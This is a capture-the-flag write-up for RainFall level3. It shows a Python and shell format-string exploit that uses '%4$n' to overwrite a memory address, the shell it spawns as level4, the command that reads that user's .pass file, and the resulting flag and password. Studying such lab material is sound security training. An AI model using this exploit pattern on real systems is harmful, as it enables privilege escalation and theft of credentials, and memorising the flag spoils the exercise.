```python
# Target address (0x804988c in little-endian)
address = "\x8c\x98\x04\x08" 

# Padding to reach count of 64 bytes
padding = "y" * 60

# Write to 4th parameter using %n
write = "%4$n"

# Final exploit
exploit = address + padding + write # address(4 bytes) + padding (60)
```

1. Create exploit file

```bash
(python -c 'print "\x8c\x98\x04\x08" + "y" * 60 + "%4$n"'; cat) | ./level3
```

1. Result

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "y" * 60 + "%4$n"'; cat) | ./level3
�yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```

## Flag

```bash
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```